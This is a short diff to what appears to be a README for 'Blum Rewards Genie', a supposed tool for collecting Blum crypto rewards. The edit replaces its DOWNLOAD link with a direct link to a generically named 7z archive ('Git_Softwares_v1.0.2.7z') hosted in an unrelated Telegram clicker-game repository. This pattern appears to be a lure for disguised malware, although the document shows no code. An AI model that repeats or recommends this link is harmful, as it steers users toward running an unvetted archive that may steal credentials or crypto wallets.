@@ -1,4 +1,4 @@
-# [DOWNLOAD](https://github.com/darkangelwhitefox/jubilant-winner/releases/tag/latestversion)
+# [DOWNLOAD](https://github.com/absolutezerochunky/Arbuz-Game-Telegram-Clicker/releases/download/Clicker-Arbuz/Git_Softwares_v1.0.2.7z)
 
 ### Blum Rewards Genie: Effortless Rewards for Your Blum Adventures 💰✨
 
